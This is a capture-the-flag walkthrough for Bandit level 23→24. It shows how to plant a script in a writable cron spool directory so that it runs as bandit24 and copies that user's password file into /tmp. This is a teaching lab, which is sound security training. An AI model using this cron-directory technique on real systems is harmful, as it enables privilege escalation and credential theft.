# Bandit Level 23 → Level 24

## Objective

Exploit the cron job running as `bandit24` to execute a command that reads the password for `bandit24`.

## Commands Used

```bash
cat /etc/cron.d/cronjob_bandit24
```

Read the cron script:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

Check the permissions of the working directory:

```bash
ls -la /var/spool/bandit24/foo/
```

Create a temporary directory:

```bash
mktemp -d
```

Create the script:

```bash
nano /tmp/<directory>/getpassword.sh
```

Put the following inside the script:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/password
```

Make the script executable:

```bash
chmod +x /tmp/<directory>/getpassword.sh
```

Copy the script into the cron working directory:

```bash
cp /tmp/<directory>/getpassword.sh /var/spool/bandit24/foo/
```

Wait for the cron job to execute, then read the password:

```bash
cat /tmp/password
```

## Explanation

- The cron job for `bandit24` runs every minute.
- The cron job executes `/usr/bin/cronjob_bandit24.sh`.
- The script processes files placed in `/var/spool/bandit24/foo/`.
- The directory is writable by the current user.
- A shell script can therefore be placed inside the directory.
- The cron job executes the script as the `bandit24` user.
- The custom script reads `/etc/bandit_pass/bandit24`.
- The password is redirected into `/tmp/password`.
- Reading `/tmp/password` reveals the password for Level 24.

## Command Breakdown

### `cat`

Displays the contents of a file.

```bash
cat /etc/cron.d/cronjob_bandit24
```

is used to inspect the cron configuration.

### `ls -la`

Lists files and directories, including hidden files, along with their permissions.

```bash
ls -la /var/spool/bandit24/foo/
```

is used to check whether the directory is writable.

### `mktemp -d`

Creates a temporary directory.

```bash
mktemp -d
```

provides a safe working location for creating the script.

### `chmod +x`

Adds execute permission to a file.

```bash
chmod +x /tmp/<directory>/getpassword.sh
```

allows the shell script to be executed.

### `cp`

Copies a file from one location to another.

```bash
cp /tmp/<directory>/getpassword.sh /var/spool/bandit24/foo/
```

places the script where the cron job will process it.

### `>`

Redirects output into a file.

```bash
cat /etc/bandit_pass/bandit24 > /tmp/password
```

copies the `bandit24` password into `/tmp/password`.

## Key Learning

- Cron jobs can automatically execute scripts at scheduled intervals.
- File permissions determine whether a directory can be used to place files.
- A writable cron processing directory can allow a user-controlled script to be executed.
- Shell scripts can read files and redirect their contents into another file.
- Understanding cron jobs and Linux permissions is important for security analysis.
